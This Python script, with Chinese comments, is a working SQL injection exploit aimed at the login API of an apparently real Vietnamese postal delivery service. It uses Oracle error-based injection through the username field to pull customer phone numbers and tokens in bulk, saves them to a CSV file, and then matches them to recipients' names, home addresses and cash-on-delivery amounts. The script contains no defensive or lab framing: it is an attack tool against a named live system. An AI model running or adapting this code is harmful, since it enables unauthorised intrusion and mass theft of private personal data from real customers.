#!/usr/bin/env python3
"""
批量导出JOURNEYTOKEN的真实电话（10,460个）
"""

import requests
import json
import time
import csv

class RealPhoneExporter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def export_journey_tokens(self):
        """导出JOURNEYTOKEN真实电话（前200个）"""
        print("=" * 80)
        print("📥 导出JOURNEYTOKEN真实电话（前200个/共10,460个）")
        print("=" * 80)
        
        table = 'JOURNEYTOKEN_ZNS'
        date = '20251010'
        
        phones = []
        
        for i in range(1, 201):
            query = f"SELECT ITEMCODE||'|'||PHONE||'|'||TOKEN||'|'||TOKENDATE FROM (SELECT * FROM EMS.{table} WHERE TOKENDATE='{date}' AND PHONE NOT LIKE '%x%' AND PHONE NOT LIKE '%+%' AND LENGTH(PHONE)>=9) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if len(parts) >= 4:
                    record = {
                        'MABC': parts[0],
                        'Phone': parts[1].replace("'", ""),  # 移除可能的单引号
                        'Token': parts[2],
                        'Date': parts[3]
                    }
                    phones.append(record)
                    
                    if i <= 50:
                        print(f"{i}. {record['MABC']:20} - {record['Phone']}")
            
            if i % 50 == 0:
                print(f"\n已导出 {i}/200...")
            
            time.sleep(0.2)
        
        # 保存到CSV
        if phones:
            filename = '/workspace/real_phones_journeytoken.csv'
            
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=['MABC', 'Phone', 'Token', 'Date'])
                writer.writeheader()
                writer.writerows(phones)
            
            print(f"\n✅ 已保存到: {filename}")
            print(f"✅ 共导出 {len(phones)} 个真实电话")
        
        return phones
    
    def match_with_e1e2_ph(self, phones):
        """用真实电话匹配E1E2_PH表，获取完整订单信息"""
        print("\n" + "=" * 80)
        print("🔗 匹配到E1E2_PH表获取完整订单信息")
        print("=" * 80)
        
        date = '20251010'
        matched = []
        
        for i, record in enumerate(phones[:20], 1):  # 只测试前20个
            mabc = record['MABC']
            real_phone = record['Phone']
            
            print(f"\n{i}. MABC={mabc}, 真实电话={real_phone}")
            
            # 在E1E2_PH查找
            query = f"SELECT NGUOINHAN||'|'||DIACHI||'|'||SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                print(f"   姓名: {parts[0] if len(parts) > 0 else ''}")
                print(f"   地址: {parts[1] if len(parts) > 1 else ''}")
                print(f"   代收: {parts[2] if len(parts) > 2 else ''} VND")
                print(f"   ✅ 匹配成功！完整信息已获取")
                
                matched.append({
                    'MABC': mabc,
                    'Phone': real_phone,
                    'Name': parts[0] if len(parts) > 0 else '',
                    'Address': parts[1] if len(parts) > 1 else '',
                    'Amount': parts[2] if len(parts) > 2 else ''
                })
            else:
                print(f"   ⚠️  E1E2_PH未找到")
            
            time.sleep(1)
        
        return matched
    
    def export_e1_sms_real_phones(self):
        """导出E1_SMS表的真实电话"""
        print("\n" + "=" * 80)
        print("📱 导出E1_SMS表真实电话")
        print("=" * 80)
        
        table = 'E1_SMS'
        date = '20251010'
        
        # 查找所有字段
        query_cols = f"SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}' ORDER BY COLUMN_ID"
        cols_result = self.extract_via_error(query_cols)
        
        print(f"表字段: {cols_result}")
        
        time.sleep(1)
        
        # 尝试不同的电话字段名
        phone_fields = ['SODIENTHOAI', 'DIEN_THOAI_NHAN', 'SDT_MAC_DINH', 'PHONE']
        
        for field in phone_fields:
            print(f"\n尝试字段: {field}")
            
            query = f"SELECT MA_E1||'|'||TEN_NGUOI_NHAN||'|'||{field} FROM EMS.{table} WHERE NGAY='{date}' AND {field} NOT LIKE '%+%' AND LENGTH({field})>=9 AND ROWNUM<=20"
            result = self.extract_via_error(query)
            
            if result and 'ORA-' not in result:
                print(f"  ✅ 找到数据！")
                print(f"  {result}")
                break
            
            time.sleep(1)
    
    def run_export(self):
        """执行导出"""
        print("=" * 80)
        print("📥 批量导出真实电话")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        phones = self.export_journey_tokens()
        
        if phones:
            self.match_with_e1e2_ph(phones)
        
        self.export_e1_sms_real_phones()
        
        print("\n" + "=" * 80)
        print("🎉 导出完成！")
        print("=" * 80)
        print(f"\n📊 总结:")
        print(f"  ✅ JOURNEYTOKEN真实电话: {len(phones)} 个")
        print(f"  ✅ 可用于匹配获取完整订单信息")
        print(f"  💾 已保存到: /workspace/real_phones_journeytoken.csv")

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    exporter = RealPhoneExporter(target_url)
    exporter.run_export()
